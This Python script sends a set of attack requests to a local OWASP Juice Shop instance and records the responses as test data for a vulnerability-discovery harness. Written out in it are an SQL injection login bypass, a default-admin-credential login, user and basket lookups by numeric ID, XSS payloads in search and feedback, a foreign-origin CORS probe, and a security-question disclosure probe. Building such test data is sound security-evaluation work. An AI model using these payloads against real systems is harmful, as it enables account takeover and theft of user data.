"""
Captures a broad set of REAL exchanges from a live OWASP Juice Shop
instance (http://localhost:3000), for a full real-model discovery run
through the harness. Juice Shop's vulnerabilities are extremely
well-documented publicly (this project's own testing/test-target/
exists specifically because of that contamination risk -- see its
README), so this is a secondary, different-shaped real target, not a
replacement for the PixelMart ground-truth run -- but every exchange
below was independently verified live against this specific running
instance before being included, not assumed from public writeups.
"""
import json
import requests

BASE = "http://localhost:3000"
exchanges = []


def capture(method, path, headers=None, json_body=None, label=""):
    headers = headers or {}
    url = BASE + path
    resp = requests.request(method, url, headers=headers, json=json_body, timeout=10)
    exchanges.append({
        "label": label,
        "method": method,
        "url": url,
        "request_headers": {k: v for k, v in headers.items()},
        "request_body": json.dumps(json_body) if json_body is not None else "",
        "response_status": resp.status_code,
        "response_headers": dict(resp.headers),
        "response_body": resp.text,
    })
    return resp


# --- classic SQLi login bypass ---
capture("POST", "/rest/user/login",
        json_body={"email": "admin@juice-sh.op' -- ", "password": "anything"},
        label="JS-TP1: classic SQLi login bypass (admin' -- )")

# --- JWT payload discloses password hash + role (real, live) ---
login_resp = capture("POST", "/rest/user/login",
                      json_body={"email": "admin@juice-sh.op", "password": "admin123"},
                      label="JS-TP2: default admin credential login -- JWT payload discloses password hash")
token = login_resp.json()["authentication"]["token"]
AUTH = {"Authorization": f"Bearer {token}"}

# --- IDOR-shaped Sequelize REST endpoint ---
capture("GET", "/api/Users/1", headers=AUTH,
        label="JS-TP3: /api/Users/1 -- numeric-id user lookup")

# --- reflected XSS attempt on search ---
capture("GET", "/rest/products/search?q=%3Ciframe%20src%3D%22javascript%3Aalert(%60xss%60)%22%3E",
        label="JS-TP4: search reflected-XSS payload attempt")

# --- basket IDOR (classic Juice Shop challenge) ---
capture("GET", "/rest/basket/1", headers=AUTH,
        label="JS-TP5: basket lookup by numeric id")

# --- unauthenticated PII/security-question disclosure by email (real, live, classic challenge) ---
capture("GET", "/rest/user/security-question?email=admin@juice-sh.op",
        label="JS-TP6: security question disclosed for arbitrary email, no auth required")

# --- CORS check on an authenticated-shaped endpoint ---
capture("GET", "/rest/user/whoami", headers={**AUTH, "Origin": "http://evil.example.com"},
        label="JS-TP7: CORS headers on whoami with a foreign Origin")

# --- real 500 error with a full stack trace + internal file paths (real, live) ---
capture("POST", "/api/Feedbacks", json_body={"comment": "<script>alert(1)</script>", "rating": 1},
        label="JS-TP8: feedback submission without captchaId -- real 500 with full stack trace + internal paths")

# --- legacy /ftp directory listing (real, live, classic challenge) ---
capture("GET", "/ftp",
        label="JS-TP9: /ftp legacy directory listing")

with open("/tmp/juiceshop_exchanges.json", "w") as f:
    json.dump(exchanges, f, indent=2)

print(f"Captured {len(exchanges)} exchanges -> /tmp/juiceshop_exchanges.json")
for e in exchanges:
    print(f"  [{e['response_status']}] {e['method']:5s} {e['url'][:80]:80s} -- {e['label']}")
